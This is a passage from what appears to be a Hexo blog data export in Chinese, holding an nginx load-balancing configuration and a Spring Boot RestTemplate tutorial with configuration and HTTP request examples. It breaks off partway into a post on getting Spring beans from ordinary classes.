127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"nginx-conf配置\"><a href=\"#nginx-conf配置\" class=\"headerlink\" title=\"nginx.conf配置\"></a>nginx.conf配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#user  nobody;</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #在http&#123;&#125;内配置</span><br><span class=\"line\">    #自己进行负载均衡配置，weight为权重</span><br><span class=\"line\">    upstream sms&#123;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        #保证收发都是同一个连接</span><br><span class=\"line\">        ip_hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    upstream xxx&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #配置自己的转发,在server&#123;&#125;内配置</span><br><span class=\"line\">          #过来的url</span><br><span class=\"line\">          location /smsCollection/ &#123;</span><br><span class=\"line\">              #转发的url</span><br><span class=\"line\">              proxy_pass http://sms;</span><br><span class=\"line\">              proxy_set_header    REMOTE-HOST $remote_addr;</span><br><span class=\"line\">              proxy_set_header   Host $host:8080;</span><br><span class=\"line\">              proxy_set_header   X-Real-IP $remote_addr;</span><br><span class=\"line\">              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">              proxy_read_timeout 300s;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          location /SmsUpstream-1.0/sms191 &#123;</span><br><span class=\"line\">              .....</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"RestTemplate","date":"2018-08-30T08:51:32.000Z","_content":"\n因为在代码中需要调用外部的接口，所以使用RestTemplate\n\n###### 1.导入\n```\n<!-- 包含有restTemplate -->\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n###### 2.完成配置类\n```\n@Configuration\npublic class RestTemplateConfig {\n  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入\n\t@Bean(name = \"RestTemplate\")\n\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory){\n\t\treturn new RestTemplate(factory);\n\t}\n\n\t@Bean\n\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory(){\n\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();\n\t\tfactory.setConnectTimeout(15000);\n\t\tfactory.setReadTimeout(5000);\n\t\treturn factory;\n\t}\n}\n```\n\n###### 3.使用\n```\npublic class AcceptDeal extends Thread {\n\n  //通过名字导入\n\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(\"RestTemplate\");\n\n\t//回执接口\n\tString url = \"url\" + \"/\" + report.getState();\n\trestTemplate.getForEntity(\"url\", String.class);\n\n}\n\n```\n设置header与发送接收类型\n```\ntry {\n           String url = \"http://xxxxx\";\n           //设置ContentType\n           HttpHeaders httpHeaders = new HttpHeaders();\n           MediaType type = MediaType.parseMediaType( \"application/x-www-form-urlencoded;charset=utf-8\");\n           httpHeaders.setContentType(type);\n           //form表单\n           MultiValueMap<String, String> paramMap = new LinkedMultiValueMap<String, String>();\n           paramMap.add(\"number\", deliver.getUserNumber().substring(2));\n           paramMap.add(\"port\", deliver.getSPNumber());\n           paramMap.add(\"content\",new String(deliver.getMessageByte(), \"UnicodeBigUnmarked\"));\n           paramMap.add(\"time\", df.format(new Date()));\n           HttpEntity<MultiValueMap<String, String>> requestEntity = new HttpEntity<MultiValueMap<String, String>>(paramMap, httpHeaders);\n           //调用回执接口\n           String re = restTemplate.postForObject(url, requestEntity, String.class);\n       }catch (Exception e){\n         e.printStackTrace();\n       }\n```\n","source":"_posts/java/RestTemplate.md","raw":"---\ntitle: RestTemplate\ndate: 2018-08-30 16:51:32\ntags: [java,springboot]\n---\n\n因为在代码中需要调用外部的接口，所以使用RestTemplate\n\n###### 1.导入\n```\n<!-- 包含有restTemplate -->\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n###### 2.完成配置类\n```\n@Configuration\npublic class RestTemplateConfig {\n  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入\n\t@Bean(name = \"RestTemplate\")\n\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory){\n\t\treturn new RestTemplate(factory);\n\t}\n\n\t@Bean\n\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory(){\n\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();\n\t\tfactory.setConnectTimeout(15000);\n\t\tfactory.setReadTimeout(5000);\n\t\treturn factory;\n\t}\n}\n```\n\n###### 3.使用\n```\npublic class AcceptDeal extends Thread {\n\n  //通过名字导入\n\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(\"RestTemplate\");\n\n\t//回执接口\n\tString url = \"url\" + \"/\" + report.getState();\n\trestTemplate.getForEntity(\"url\", String.class);\n\n}\n\n```\n设置header与发送接收类型\n```\ntry {\n           String url = \"http://xxxxx\";\n           //设置ContentType\n           HttpHeaders httpHeaders = new HttpHeaders();\n           MediaType type = MediaType.parseMediaType( \"application/x-www-form-urlencoded;charset=utf-8\");\n           httpHeaders.setContentType(type);\n           //form表单\n           MultiValueMap<String, String> paramMap = new LinkedMultiValueMap<String, String>();\n           paramMap.add(\"number\", deliver.getUserNumber().substring(2));\n           paramMap.add(\"port\", deliver.getSPNumber());\n           paramMap.add(\"content\",new String(deliver.getMessageByte(), \"UnicodeBigUnmarked\"));\n           paramMap.add(\"time\", df.format(new Date()));\n           HttpEntity<MultiValueMap<String, String>> requestEntity = new HttpEntity<MultiValueMap<String, String>>(paramMap, httpHeaders);\n           //调用回执接口\n           String re = restTemplate.postForObject(url, requestEntity, String.class);\n       }catch (Exception e){\n         e.printStackTrace();\n       }\n```\n","slug":"java/RestTemplate","published":1,"updated":"2019-01-21T09:08:32.334Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051a000m6cvpnkvgpwqk","content":"<p>因为在代码中需要调用外部的接口，所以使用RestTemplate</p>\n<h6 id=\"1-导入\"><a href=\"#1-导入\" class=\"headerlink\" title=\"1.导入\"></a>1.导入</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 包含有restTemplate --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-完成配置类\"><a href=\"#2-完成配置类\" class=\"headerlink\" title=\"2.完成配置类\"></a>2.完成配置类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RestTemplateConfig &#123;</span><br><span class=\"line\">  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入</span><br><span class=\"line\">\t@Bean(name = &quot;RestTemplate&quot;)</span><br><span class=\"line\">\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory)&#123;</span><br><span class=\"line\">\t\treturn new RestTemplate(factory);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Bean</span><br><span class=\"line\">\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory()&#123;</span><br><span class=\"line\">\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();</span><br><span class=\"line\">\t\tfactory.setConnectTimeout(15000);</span><br><span class=\"line\">\t\tfactory.setReadTimeout(5000);</span><br><span class=\"line\">\t\treturn factory;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  //通过名字导入</span><br><span class=\"line\">\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(&quot;RestTemplate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//回执接口</span><br><span class=\"line\">\tString url = &quot;url&quot; + &quot;/&quot; + report.getState();</span><br><span class=\"line\">\trestTemplate.getForEntity(&quot;url&quot;, String.class);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置header与发送接收类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try &#123;</span><br><span class=\"line\">           String url = &quot;http://xxxxx&quot;;</span><br><span class=\"line\">           //设置ContentType</span><br><span class=\"line\">           HttpHeaders httpHeaders = new HttpHeaders();</span><br><span class=\"line\">           MediaType type = MediaType.parseMediaType( &quot;application/x-www-form-urlencoded;charset=utf-8&quot;);</span><br><span class=\"line\">           httpHeaders.setContentType(type);</span><br><span class=\"line\">           //form表单</span><br><span class=\"line\">           MultiValueMap&lt;String, String&gt; paramMap = new LinkedMultiValueMap&lt;String, String&gt;();</span><br><span class=\"line\">           paramMap.add(&quot;number&quot;, deliver.getUserNumber().substring(2));</span><br><span class=\"line\">           paramMap.add(&quot;port&quot;, deliver.getSPNumber());</span><br><span class=\"line\">           paramMap.add(&quot;content&quot;,new String(deliver.getMessageByte(), &quot;UnicodeBigUnmarked&quot;));</span><br><span class=\"line\">           paramMap.add(&quot;time&quot;, df.format(new Date()));</span><br><span class=\"line\">           HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt;(paramMap, httpHeaders);</span><br><span class=\"line\">           //调用回执接口</span><br><span class=\"line\">           String re = restTemplate.postForObject(url, requestEntity, String.class);</span><br><span class=\"line\">       &#125;catch (Exception e)&#123;</span><br><span class=\"line\">         e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>因为在代码中需要调用外部的接口，所以使用RestTemplate</p>\n<h6 id=\"1-导入\"><a href=\"#1-导入\" class=\"headerlink\" title=\"1.导入\"></a>1.导入</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 包含有restTemplate --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-完成配置类\"><a href=\"#2-完成配置类\" class=\"headerlink\" title=\"2.完成配置类\"></a>2.完成配置类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RestTemplateConfig &#123;</span><br><span class=\"line\">  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入</span><br><span class=\"line\">\t@Bean(name = &quot;RestTemplate&quot;)</span><br><span class=\"line\">\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory)&#123;</span><br><span class=\"line\">\t\treturn new RestTemplate(factory);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Bean</span><br><span class=\"line\">\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory()&#123;</span><br><span class=\"line\">\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();</span><br><span class=\"line\">\t\tfactory.setConnectTimeout(15000);</span><br><span class=\"line\">\t\tfactory.setReadTimeout(5000);</span><br><span class=\"line\">\t\treturn factory;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  //通过名字导入</span><br><span class=\"line\">\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(&quot;RestTemplate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//回执接口</span><br><span class=\"line\">\tString url = &quot;url&quot; + &quot;/&quot; + report.getState();</span><br><span class=\"line\">\trestTemplate.getForEntity(&quot;url&quot;, String.class);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置header与发送接收类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try &#123;</span><br><span class=\"line\">           String url = &quot;http://xxxxx&quot;;</span><br><span class=\"line\">           //设置ContentType</span><br><span class=\"line\">           HttpHeaders httpHeaders = new HttpHeaders();</span><br><span class=\"line\">           MediaType type = MediaType.parseMediaType( &quot;application/x-www-form-urlencoded;charset=utf-8&quot;);</span><br><span class=\"line\">           httpHeaders.setContentType(type);</span><br><span class=\"line\">           //form表单</span><br><span class=\"line\">           MultiValueMap&lt;String, String&gt; paramMap = new LinkedMultiValueMap&lt;String, String&gt;();</span><br><span class=\"line\">           paramMap.add(&quot;number&quot;, deliver.getUserNumber().substring(2));</span><br><span class=\"line\">           paramMap.add(&quot;port&quot;, deliver.getSPNumber());</span><br><span class=\"line\">           paramMap.add(&quot;content&quot;,new String(deliver.getMessageByte(), &quot;UnicodeBigUnmarked&quot;));</span><br><span class=\"line\">           paramMap.add(&quot;time&quot;, df.format(new Date()));</span><br><span class=\"line\">           HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt;(paramMap, httpHeaders);</span><br><span class=\"line\">           //调用回执接口</span><br><span class=\"line\">           String re = restTemplate.postForObject(url, requestEntity, String.class);</span><br><span class=\"line\">       &#125;catch (Exception e)&#123;</span><br><span class=\"line\">         e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Spring上下文","date":"2018-08-30T08:34:21.000Z","_content":"\n非spring管理的类（普通类），获得一个Bean。\n在一个普通类中，@Autowired和new都不能导入一个Bean对象\n```\npublic class AcceptDeal extends Thread {\n  @Autowired\n  LogService logservice;//但此时mapper中信息又为null\n  //或者new 一个对象\n  //LogService logservice = new LogService();//此时mapper又不能导入\n}\n```\n解决方案：使用Spring上下文，获取Bean\n\n###### 1.新建一个工具类SpringUtil\n可以根据自己的需要添加上下文相关的管理方法\n```\npackage 